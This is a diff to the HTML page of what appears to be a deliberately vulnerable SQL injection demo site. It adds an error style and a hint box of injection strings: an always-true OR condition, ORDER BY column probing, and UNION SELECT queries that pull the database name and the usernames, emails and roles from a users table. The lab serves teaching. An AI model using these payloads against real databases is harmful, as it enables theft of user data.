@@ -61,6 +61,11 @@
             border: 1px solid #bee5eb;
             margin-top: 20px;
         }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
         .nav {
             text-align: center;
             margin-bottom: 30px;
@@ -172,9 +177,10 @@
             <h3>SQL Injection Demo:</h3>
             <p><strong>Normal search:</strong> <code>Laptop</code></p>
             <p><strong>Show all products:</strong> <code>' OR '1'='1</code></p>
-            <p><strong>Extract database name:</strong> <code>' UNION SELECT 1, database(), 3, 4 --</code></p>
+            <p><strong>Find number of columns (ORDER BY):</strong> <code>' ORDER BY 1 #</code>, <code>' ORDER BY 2 #</code>, ... until error</p>
+            <p><strong>Extract database name:</strong> <code>' UNION SELECT 1, database(), 3, 4 #</code></p>
+            <p><strong>Extract users table:</strong> <code>' UNION SELECT id, username, email, role FROM users #</code></p>
         </div>
     </div>
 </body>
 </html>
-
